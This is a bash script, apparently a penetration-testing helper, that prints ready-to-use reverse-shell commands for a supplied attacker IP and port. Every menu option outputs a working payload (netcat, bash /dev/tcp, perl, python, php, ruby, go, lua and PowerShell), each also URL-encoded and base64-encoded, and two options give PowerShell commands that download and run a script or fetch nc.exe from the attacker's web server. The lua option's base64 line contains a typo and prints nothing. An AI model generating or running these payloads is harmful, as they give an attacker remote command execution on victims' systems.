#!/bin/bash

# generate reverse-shells

# make symlink in /usr/local/bin
# sudo ln -s /opt/son-of-revshell.sh /usr/local/bin/revshell
# takes lhost and lport as arguments
# eg: revshell 10.10.10.10 8888

lhost=$1
lport=$2
message=''
urlencode() {
    # urlencode $message
    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%%%02X' "'$c" ;;
        esac
    done
	printf '\n'
}

# colours first
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'


# Header
echo -e "${RED}"
figlet "Generating Eeevil..."
echo -e "${NC}"


if [ -z "$*" ]
  then
    echo "[*] Enter the lhost then lport as arguments!"
    echo "[*] Syntax: ./revshell <lhost ip> <lport number>"
exit 1
fi



echo -e ""
echo -e "${BLUE}"
echo -e "Welcome to sh1n0bi's revshell generator!"
echo -e "Select the type of revshell you want from this list..."
echo -e "1=netcat; 1b=nc-win; 1c=nc-bsd; 2=bash; 3=perl; 4=python; 5=php; 6=ruby; 7=go; 8=lua; "
echo -e "Or some helpful powershell commands: 9=ps-revshell; 9a=iex (shell.ps1); 9b=iwr:"
echo -e "${NC}"
echo -e ""

# case statement
echo -e "${RED}"
read -p "Enter Selection: " langu
echo -e "${NC}"
#############################

echo -e "${YELLOW}"
echo -e "Don't forget to set a listener on $lport..." |cowsay
echo -e "${NC}"

if [ -z $langu ];then
	echo "Just a number please..."
	exit
fi

case $langu in
	1)
	 message="nc $lhost $lport -e /bin/bash"
	 echo "$message"
	 echo -e "${YELLOW}And URLencoded! ${NC}"
	 urlencode "$message"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "$message" |base64 -w0;;

	1b)
      message=".\nc.exe $lhost $lport -e cmd"
	  echo "$message"
	  echo -e "${YELLOW}And URLencoded! ${NC}"
      urlencode "$message"
	  echo -e "${YELLOW}And in base64 encoding! ${NC}"
	  echo "$message" |base64 -w0;;

	1c)
	 message="rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1| nc $lhost $lport > /tmp/f"
	 echo "$message"
	 echo -e "${YELLOW}And URLencoded! ${NC}"
     urlencode "$message"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "$message" |base64 -w0;;

	2)
	 message="bash -i >& /dev/tcp/$lhost/$lport 0>&1"
	 echo "$message"
	 echo -e "${YELLOW}And URLencoded! ${NC}"
     urlencode "$message"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "$message" |base64 -w0;;

	3)
	 message="perl -e 'use Socket;$i=\"$lhost\";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
	 echo "$message"
	 echo -e "${YELLOW}And URLencoded! ${NC}"
     urlencode "$message"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "$message" |base64 -w0;;

	4)
	 message="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
	 echo "$message"
	 echo -e "${YELLOW}And URLencoded! ${NC}"
     urlencode "$message"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "$message" |base64 -w0;;


	5)
	 message="php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
	 echo "$message"
	 echo -e "${YELLOW}And URLencoded! ${NC}"
     urlencode "$message"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "$message" |base64 -w0;;

	6)
	 message="ruby -rsocket -e'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
	 echo "$message"
	 echo -e "${YELLOW}And URLencoded! ${NC}"
     urlencode "$message"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "$message" |base64 -w0;;

	7)
	 message="echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$lhost\":\"$lport\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
	 echo "$message"
	 echo -e "${YELLOW}And URLencoded! ${NC}"
     urlencode "$message"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "$message" |base64 -w0;;

	8)
	 message='lua -e \"local s=require('socket');local t=assert(s.tcp());t:connect('$lhost',$lport);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();\"'
	 echo "$message"
	 echo -e "${YELLOW}And URLencoded! ${NC}"
     urlencode "$message"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "$mesage" |base64 -w0;;



	9)
	 message="powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
	 echo "$message"
	 echo -e "${YELLOW}And URLencoded! ${NC}"
     urlencode "$message"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "$message" |base64 -w0;;


	9a)
	 message="powershell -c iex(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')"
	 echo "$message"
	 echo -e "${YELLOW}Remember to copy shell.ps1 to the PWD in Kali, and amend the last line! Then set a python server running! ${NC}"
	 echo -e "${YELLOW}python3 -m http.server 80${NC}"
	 echo -e "${YELLOW}And URLencoded! ${NC}"
     urlencode "$message"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "$message" |base64 -w0;;


	9b)
	 echo "powershell Invoke-WebRequest -uri http://$lhost/nc.exe -outfile c:\boo\nc.exe"
	 echo -e "${YELLOW}Dont forget to create 'boo' directory first, and serve file with a python server!${NC}"
	 echo -e "${YELLOW}python3 -m http.server 80${NC}"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "powershell Invoke-WebRequest -uri http://$lhost/nc.exe -outfile c:\boo\nc.exe" |base64 -w0;;


	*)
	 echo -e "${RED}Sorry, just numbers 1-9b please! ${NC}"
	 exit

esac

